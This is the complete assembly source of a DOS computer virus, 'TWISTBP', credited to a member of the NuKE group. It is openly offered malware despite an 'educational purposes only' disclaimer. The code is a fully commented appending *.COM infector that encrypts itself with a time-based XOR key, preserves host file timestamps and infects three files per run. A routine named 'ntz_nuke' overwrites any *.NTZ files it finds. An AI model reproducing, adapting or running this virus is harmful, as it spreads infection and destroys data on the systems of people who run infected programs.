;                        --==TWISTBP.ASM==--
;
;   This program is for eductional purposes only. The author takes no 
;   responsibilty for any use or misuse of this program. (Generic Disclaimer)
;
;        -Appending *.COM infector
;        -Random encrpytion using dos get time funtion
;        -Preserves original file date and time 
;        -Three infections per run 
;        -Nuke those pesky NTZ files off the face of the EARTH
;        -A encryption routine big enought to get 10 signatures 
;
;        -= Thanks to FireCracker, Memory Lapse, Viper, Talon 
;        -= Qark, and everyone else that responded to my stupid 
;        -= messages. 
;        -= Special thanks to all the NuKE Members 
;
;  Mr. Twister, NuKE
;
;        Assemble with tasm twistbp
;        link with     tlink /t twistbp

.model tiny
.radix 16
.code

        org 100h

byt             equ     end_it - ntz_nuke
virus_size      equ     end_it - start

start:  xchg    si,si                   ; just filling space 
        nop                             ; infection marker
        nop                             ; infection marker 
        call    loc_1                   ; do the call to push called location
loc_1:  pop     bp                      ; onto the stack then pop into bp 
        sub     bp,107                  ; sub 107 to get back to -0-
        call    decr                    ; on the first run the encrypt value
                                        ; is -0- so no change on subsquent
                                        ; runs the random value is stored into
                                        ; enc_val so file is decrypted
        
        jmp    where                    ; this is the actual virus                  

        
what:   call    enc                     ; encrypt the main part of the virus
        
        mov     ah,40                   ; Write file
        mov     cx,virus_size           ; Write the virus size
        lea     dx,[bp+offset start]    ; Load the offset of the
                                        ; virus into dx
        int     21                      ; dos function 
        inc     [bp+counter]            ; got one increase the counter
        jmp     $+2                     ; Thanks Screaming  
        call    decr                     ; decrypt the virus so we can continue
        ret                             ; return back to the main body 
        
        nop                             ; marker
        nop                             ; marker
        nop                             ; marker
        enc_val db      0               ; this is the value that we will 
        counter db      0               ; encrypt with, its zero to start
        nop                             ; then changes on subquent infections
        nop                             ; marker
enc:    mov     ah,2c                   ; dos get time function  
        int     21                      ; dos does it 
        mov     [bp+enc_val],cl         ; move the minute into the encryption
                                        ; value, this allows for 59 variations
decr:   mov cx,byt                      ; byt is the number of bytes to xor 
        lea si,[bp+offset Ntz_nuke]     ; point si at the start of the actual 
                                        ; virus 
dec_lp: lea di,[bp+offset buff]         ; point di at the buffer 
        movsb                           ; move the byte at si into the buffer
        mov al,[bp+offset buff]         ; move the buffer into al 
        xor al,[bp+enc_val]             ; xor the al with the enc_val 
        mov [bp+offset buff],al         ; move the byte back into the buffer
        lea di,[si-1]                   ; point di back to where the byte came from
        lea si,[bp+offset buff]         ; point si at the buffer 
        movsb                           ; mov si to di buffer back into the virus
        mov si,di                       ; movsb increments after each use 
        loop dec_lp                     ; loop X number of times X=byt
        ret                             ; done with this function bail

ntz_nuke: 
        mov     ah,4e                   ; Find the first match
get_ntz:
        lea     dx,[bp+offset Ntzmask]  ; Load the offset filemask dx
        int     21                      ; dos call
        jc      do_again                ; can't find continue infection 
        lea     dx,[bp+offset end_it+1e]; Load the offset fname (�)
        Mov     Cl, 7Ah                 ; This loads 7a04 into ax
        Xchg    Ah, Cl                  ; shr makes 7a04 into 3d02
        Mov     Al, 04h                 ; '   '
        Shr     Ax,1                    ; Open The File Up
        int     21                      ; dos does it 
        
        mov     bx,ax                   ; move file handle into bx
        mov     ax,4202                 ; go to the end of the file
        xor     cx,cx                   ; zero these two register or 
        xor     dx,dx                   ; you'll get very wierd results
        int     21                      ; thanks dos
        mov     [bp+how_much],ax        ; ax is the file size we want to get
                                        ; it all 
        xor     cx,cx                   ; zero these two register or  
        xor     dx,dx                   ; you'll get very wierd results
        mov     ax,4200                 ; move back to the front of the file
        int     21                      ; thanks dos

        push    cs                      ; cs and ds are the same 
        pop     ds
        lea     dx,[bp+New_dta]         ; write the information to the file 
                                        ; from the new dta area
        mov     cx,[bp+how_much]        ; how much are we going to smear
        xor     ax,ax
        mov     ah,40                   ; write file function 
        int     21                      ; dos call 
        mov     ah,3e                   ; close the file
        int     21h                     ; dos call

        mov     ah,4f                   ; search for another one 
        jmp     get_ntz                 ; go back to the start 
do_again: ret                           ; only jumps here when sure no more
                                        ; exists


where:  lea     bx,[bp+offset return_bytes] ; Load the address
                                        ; of bp plus the original offset
                                        ; of return bytes into di.
        push    ds:[bx]                 ; push the first two bytes of the
                                        ; original program onto the stack
        add     bx,02                   ; increase di to point to the next
                                        ; two bytes we saved of the orig prog
        push    ds:[bx]                 ; push the last two bytes we saved
                                        ; of the original program onto the
                                        ; stack
                
                
        mov     ah,1a                   ; Set DTA
        lea     dx,[bp+offset end_it]   ; Load the effective address
                                        ; of the end of the virus to
                                        ; be used for the new DTA
        int     21                      ; dos call
        
        call    ntz_nuke                ; see ya Ntz
        
        mov     ah,4e                   ; Find the first match
get_f:  lea     dx,[bp+offset filemask] ; Load the offset filemask dx
        int     21                      ; dos call
        jc      Jp_err                  ; can't find the file name outahere
        jmp     getbad                  ; sloppy jump to get over near
jp_err: jmp  exit_error                 ; jump problem
getbad: mov     ah,2f                   ; get the new DTA
        int     21                      ; this is returned in bx
        xor     ax,ax                   ; clear up ax
                
                
        lea     dx,[bp+offset end_it+1e]  ; Load the offset fname (�)
        Mov     Cl, 7Ah                 ; This loads 7a04 into ax
        Xchg    Ah, Cl                  ; shr makes 7a04 into 3d02
        Mov     Al, 04h                 ; '   '
        Shr     Ax,1                    ; Open The File Up
        int     21                       
        
        
        ;mov     ax,3d02                 ; open file function - read/write
        ;int     21                      ; dos call 
                
                
                  
        xchg    bx,ax                   ; move the file handle into BX
                
        mov     ax,5700                 ; get the files original date
        int     21                      ; and time and move this 
        mov     [bp+date],dx            ; value to date/ time
        mov     [bp+time],cx            ; move cd into buffer 
                
        lea     di,[bp+offset end_it+1a] ; Load the offset fsize (�)
        mov     ax,word ptr ds:[di]     ; Move this fsize into ax
        sub     ax,3                    ; Take off three to build jmp
        mov     word ptr [bp+jump_address+1],ax ; save these bytes
                                        ; at jump address+1 which is
                                        ; jmp (xx xx+3) or 0e9 xx xx
               
        mov     ah,3f                   ; Read file
        mov     cx,4                    ; Read 4 bytes
        lea     dx,[bp+offset return_bytes]     ; Load the offset dx
        int     21                      ; dos call
        lea     di,[bp+offset return_bytes+3]   ; Load the offset of
                                        ; the fourth byte
                                        ; we just read into
                                        ; the virus
        cmp     byte ptr ds:[di],90     ; Is this byte a nop?
        je      nxtvic                  ; If so assume infected,
                                        ; close file, and run
                                        ; infection cycle again
               
               
        mov     ax,4200                 ; Goto beginning of file
        xor     cx,cx                   ; cx must be 0  
        xor     dx,dx                   ; dx must be 0
        int     21                      ; dos call
                
        mov     ah,40                   ; Write file
        mov     cx,4                    ; Write four bytes
        lea     dx,[bp+offset jump_address]     ; Load the offset of 
                                        ; the bytes to write 
                                        ; (which is our jmp constuction)
        int     21                      ; dos call 
        mov     ax,4202                 ; Goto end of file
        xor     cx,cx                   ; cx must be 0
        xor     dx,dx                   ; dx must be 0
        int     21                      ; dos call 
        call    what                    ; this is the actual part tha writes
        jmp     $+2                     ; thanks again screaming
exit_n: mov     cx,[bp+time]            ; Write the original date
        mov     dx,[bp+date]            ; back to the infected file 
        mov     ax,5701                 ; dos write date function 
        int     21                      ; dos call 
        mov     ah,3e                   ; Close the file, the
                                        ; infection is complete
        int     21                      ; dos call 
        cmp     [bp+counter],03         ; how many files do you want to infect?
        je      exit_error
nxtvic: mov     ah,4f                   ; Continue the infection
                                        ; process.  Find the next match!
        jmp     get_f                   ; Doit again, and stop only
                                        ; when int 21 ah=4f reports
                                        ; no more matches!
exit_error:     cli                     ; clear interupts 
        mov     ah,1a                   ; Set DTA
        mov     dx,80                   ; Change to original DTA
        int     21                      ; dos call 
        mov     bx,102                  ; Set bx to 102
        pop     [bx]                    ; pop the last two saved
                                        ; bytes into ds:[102]
        dec     bx                      ; decrease bx so that is
        dec     bx                      ; points to 100
        pop     [bx]                    ; pop the first two saved
                                        ; bytes into ds:[100]
        push    bx                      ; bx=100
        xor     ax,ax                   ; most viruses don't do this
        xor     bx,bx                   ; sequence, but since some
        xor     cx,cx                   ; programs assume the reg's
        xor     dx,dx                   ; are set to 0 like they
        xor     bp,bp                   ; should be, this is an
        xor     si,si                   ; extra precaution.
        xor     di,di
        ret                             ; return to host
ntzmask         db      '*.NTZ',0
buff            db      ?
date            dw      ? 
time            dw      ?
filemask        db      '*M.COM',0              ; Look for *.com's
jump_address    db      0e9,0,0,90              ; jmp xx xx+3, and 90 is the
new_dta         dw      ?                       ; infection marker
how_much        dw      ?
return_bytes    db      0cdh,20,0,0             ; simple way to end the
                                                ; first generation (it's
end_it:                                         ; the same as saying int 20)       
                                         
end start
end code 
